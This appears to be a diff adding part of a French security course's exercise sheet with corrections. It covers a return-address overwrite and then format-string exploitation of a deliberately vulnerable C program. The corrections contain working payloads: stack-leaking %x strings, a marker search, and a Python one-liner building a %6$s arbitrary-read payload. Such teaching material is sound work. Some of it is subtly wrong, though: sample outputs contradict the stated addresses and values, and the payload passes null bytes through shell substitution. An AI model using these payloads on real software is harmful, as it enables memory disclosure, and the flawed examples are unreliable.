+    \item \texttt{on est dans secret} : la fonction \texttt{secret()} est bien exécutée au retour de \texttt{f} !
+    \item Le \textit{segfault} final est attendu : quand \texttt{secret()} termine, elle essaie de retourner à une adresse invalide car la pile est corrompue.
+\end{itemize}
+
+\begin{pointcle}
+Le principe de cette attaque est simple : on calcule la distance entre le début du tampon vulnérable et l'adresse de retour (\texttt{savedRIP}), on remplit cette zone avec du padding, puis on écrit l'adresse de la fonction cible en \textbf{little-endian}. L'option \texttt{-no-pie} est indispensable pour connaître les adresses à l'avance.
+\end{pointcle}
+
+\begin{attention}
+Sur une architecture x86-64, les adresses sont codées sur 8 octets en \textbf{little-endian}. L'adresse \texttt{0x00000000004011fd} s'écrit donc \texttt{\textbackslash xfd\textbackslash x11\textbackslash x40\textbackslash x00\textbackslash x00\textbackslash x00\textbackslash x00\textbackslash x00} en mémoire.
+
+Attention aussi : \texttt{python3 -c "print(...)"} ajoute un retour à la ligne et peut mal gérer les octets nuls. Il est plus sûr d'utiliser \texttt{sys.stdout.buffer.write()} pour écrire des octets bruts.
+\end{attention}
+\end{correction}
+
+\end{exercice}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCICE 4 : Chaîne de format printf
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice}[Exploitation de la chaîne de format \texttt{printf}]
+On considère le code suivant compilé avec les options \texttt{-fno-stack-protector -no-pie} :
+\begin{lstlisting}[language=C]
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+  unsigned long d;
+  char texte[512];
+
+  static int test_var = 100*256*256+100*256+100;
+  if(argc < 3) {
+    printf("Usage: %s <text to print> <entier>\n", argv[0]);
+    exit(0);
+  }
+  d=atoi(argv[2]);
+
+  strcpy(texte, argv[1]);
+  printf("La bonne facon d'afficher des entrees utilisateurs:\n");
+  printf("%s", texte);
+  printf("\nLa mauvaise facon d'afficher des entrees utilisateurs:\n");
+  printf(texte);
+  printf("\n");
+  // Debug output
+  printf("[*] test_var @ %p = %lu, %04x\n", &test_var, &test_var, test_var);
+  printf("[*] adresse de d=%p, valeur de d=0x%016lx\n", &d, d);
+  printf("[*] adresse de texte=%p\n", texte);
+  exit(0);
+}
+\end{lstlisting}
+
+\begin{enumerate}
+\item Comprendre et tester le programme, puis appliquer ce que l'on a vu en cours pour afficher le contenu de la pile de \texttt{main} en choisissant bien l'argument du programme dans la ligne de commande.
+\item Si l'argument du programme contient le format \texttt{"\%s"}, que va-t-il se passer ? Peut-on choisir l'adresse qui concerne \texttt{"\%s"} et l'appliquer pour lire la valeur de \texttt{test\_var} ?
+\end{enumerate}
+
+\begin{correction}
+\textbf{Question 1 : Afficher le contenu de la pile}
+
+\medskip
+
+\textbf{Compréhension du programme :}
+
+Le programme contient deux appels à \texttt{printf} avec l'entrée utilisateur :
+\begin{itemize}
+    \item \texttt{printf("\%s", texte)} : affichage \textbf{sûr}. La chaîne de format est fixe (\texttt{"\%s"}), l'entrée utilisateur est un argument.
+    \item \texttt{printf(texte)} : affichage \textbf{dangereux}. L'entrée utilisateur EST la chaîne de format. Si elle contient des spécificateurs comme \texttt{\%x}, \texttt{\%lx}, \texttt{\%s}, \texttt{printf} ira lire des arguments supplémentaires qui n'existent pas, piochant dans les registres puis sur la pile.
+\end{itemize}
+
+\textbf{Test de base :}
+\begin{lstlisting}[language=bash,numbers=none]
+$ gcc -fno-stack-protector -no-pie -g exo4.c -o exo4
+$ ./exo4 "Bonjour" 42
+La bonne facon d'afficher des entrees utilisateurs:
+Bonjour
+La mauvaise facon d'afficher des entrees utilisateurs:
+Bonjour
+[*] test_var @ 0x404048 = 4210724, 00404064
+[*] adresse de d=0x7fffffffdb98, valeur de d=0x000000000000002a
+[*] adresse de texte=0x7fffffffdb90
+\end{lstlisting}
+
+Pas de différence visible, car l'entrée ne contient pas de spécificateur de format.
+
+\textbf{Lecture de la pile avec \texttt{\%08x} :}
+
+On injecte des spécificateurs \texttt{\%08x} (affichage hexadécimal sur 8 chiffres) :
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo4 "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x" 42
+La bonne facon d'afficher des entrees utilisateurs:
+%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
+La mauvaise facon d'afficher des entrees utilisateurs:
+ffffe3a8.00000003.00000000.00000000.00404048.78383025.3830252e.30252e78
+\end{lstlisting}
+
+\textbf{Analyse :}
+\begin{itemize}
+    \item L'affichage \og{}bon\fg{} montre la chaîne telle quelle (les \texttt{\%08x} sont traités comme du texte).
+    \item L'affichage \og{}mauvais\fg{} interprète chaque \texttt{\%08x} comme un format : \texttt{printf} lit les valeurs des registres (en x86-64, les arguments suivants sont passés via \texttt{rsi}, \texttt{rdx}, \texttt{rcx}, \texttt{r8}, \texttt{r9}), puis il lit des valeurs sur la pile.
+    \item Les valeurs \texttt{78383025}, \texttt{3830252e}, etc. sont les codes ASCII de la chaîne de format elle-même (\texttt{\%08x.\%08x...}), car \texttt{texte} est une variable locale qui se trouve sur la pile.
+\end{itemize}
+
+On peut aussi utiliser \texttt{\%lx} pour afficher des mots de 8 octets (64 bits) :
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo4 "%016lx|%016lx|%016lx|%016lx|%016lx|%016lx|%016lx" 42
+\end{lstlisting}
+
+Cela permet de visualiser la pile mot par mot et de repérer les adresses, les valeurs des variables locales, les adresses de retour, etc.
+
+\begin{pointcle}
+L'appel \texttt{printf(texte)} où \texttt{texte} est contrôlé par l'utilisateur est une vulnérabilité de type \textit{format string}. L'attaquant peut utiliser des spécificateurs de format pour :
+\begin{itemize}
+    \item \texttt{\%x}, \texttt{\%lx} : lire des valeurs sur la pile (fuite de mémoire)
+    \item \texttt{\%s} : lire une chaîne à une adresse arbitraire
+    \item \texttt{\%n} : \textbf{écrire} en mémoire (nombre de caractères écrits)
+\end{itemize}
+\end{pointcle}
+
+\bigskip
+
+\textbf{Question 2 : Utilisation de \texttt{\%s} pour lire \texttt{test\_var}}
+
+\medskip
+
+\textbf{Que fait \texttt{\%s} ?}
+
+Le spécificateur \texttt{\%s} attend un argument de type \texttt{char*} (un pointeur vers une chaîne). \texttt{printf} va lire la valeur suivante disponible (registre ou pile) et l'interpréter comme une \textbf{adresse mémoire}, puis afficher la chaîne de caractères à cette adresse jusqu'au premier octet nul (\texttt{\textbackslash 0}).
+
+Si la valeur lue ne correspond pas à une adresse valide, le programme fait un \textit{segfault}.
+
+\textbf{Test simple :}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo4 "%s" 42
+La mauvaise facon d'afficher des entrees utilisateurs:
+Segmentation fault (core dumped)
+\end{lstlisting}
+
+Le premier \og{}argument\fg{} que \texttt{printf} récupère pour \texttt{\%s} n'est pas une adresse valide, d'où le crash.
+
+\textbf{Stratégie pour lire \texttt{test\_var} :}
+
+On connaît l'adresse de \texttt{test\_var} grâce à la sortie de debug (par exemple \texttt{0x404048}). L'idée est de :
+\begin{enumerate}
+    \item Placer l'adresse de \texttt{test\_var} dans notre chaîne d'entrée \texttt{texte} (qui est sur la pile)
+    \item Utiliser suffisamment de \texttt{\%x} ou \texttt{\%lx} pour \og{}consommer\fg{} les arguments jusqu'à atteindre l'endroit sur la pile où se trouve notre adresse
+    \item Terminer par un \texttt{\%s} qui lira la chaîne à l'adresse que nous avons placée
+\end{enumerate}
+
+Concrètement, il faut d'abord déterminer à quel \og{}numéro d'argument\fg{} correspond le début de \texttt{texte} sur la pile. On peut le faire en plaçant un marqueur reconnaissable (comme \texttt{AAAA} = \texttt{0x41414141}) et en comptant les \texttt{\%x} nécessaires pour le voir apparaître :
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo4 "AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x" 42
+La mauvaise facon d'afficher des entrees utilisateurs:
+AAAAffffe3a8.00000003.00000000.00000000.00404048.41414141.78383025 ...
+\end{lstlisting}
+
+On voit \texttt{41414141} apparaître en 6\ieme{} position : cela signifie que le 6\ieme{} \og{}argument\fg{} de \texttt{printf} correspond au début de \texttt{texte} sur la pile.
+
+On peut utiliser la notation directe \texttt{\%6\$s} (accès direct au 6\ieme{} argument avec le format \texttt{\%s}) pour lire la chaîne à l'adresse que l'on place au début de \texttt{texte}.
+
+\textbf{Construction du payload :}
+
+On place l'adresse de \texttt{test\_var} (\texttt{0x404048}) en début de chaîne, suivie de \texttt{\%6\$s} :
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./exo4 $(python3 -c "
+import sys
+addr = b'\x48\x40\x40\x00\x00\x00\x00\x00'  # 0x404048 en little-endian
+payload = addr + b'%6\$s'
+sys.stdout.buffer.write(payload)
+") 42
+\end{lstlisting}
+
+Le \texttt{\%6\$s} dit à \texttt{printf} : \og{}prends le 6\ieme{} argument (qui est le début de \texttt{texte}, donc les 8 premiers octets = notre adresse) et interprète-le comme un pointeur vers une chaîne\fg{}. \texttt{printf} va alors lire les octets à l'adresse \texttt{0x404048} (celle de \texttt{test\_var}) et les afficher comme une chaîne de caractères.
+
+\begin{attention}
+La valeur de \texttt{test\_var} est $100 \times 256^2 + 100 \times 256 + 100 = \texttt{0x00646464}$. En mémoire (little-endian), cela donne les octets \texttt{64 64 64 00}. Interprétés comme une chaîne, cela affiche \texttt{ddd} (code ASCII \texttt{0x64} = \texttt{'d'}) suivi d'un octet nul (fin de chaîne). On lira donc la chaîne \texttt{"ddd"}.
+\end{attention}
+
+\textbf{Variante avec \texttt{\%n\$x} :} on peut aussi utiliser \texttt{\%6\$x} ou \texttt{\%6\$lx} pour afficher directement la valeur à la position 6 en hexadécimal (sans l'interpréter comme un pointeur). Cela afficherait l'adresse elle-même (\texttt{0x404048}) et non le contenu pointé.
+
+\begin{pointcle}
+Les vulnérabilités de chaîne de format sont particulièrement dangereuses car elles permettent à la fois la \textbf{lecture} (\texttt{\%x}, \texttt{\%s}) et l'\textbf{écriture} (\texttt{\%n}) arbitraires en mémoire. La correction est simple : \textbf{toujours} passer l'entrée utilisateur comme argument et non comme format : \texttt{printf("\%s", input)} au lieu de \texttt{printf(input)}.
+\end{pointcle}
+\end{correction}
+
+\end{exercice}
+
+
+\end{document}
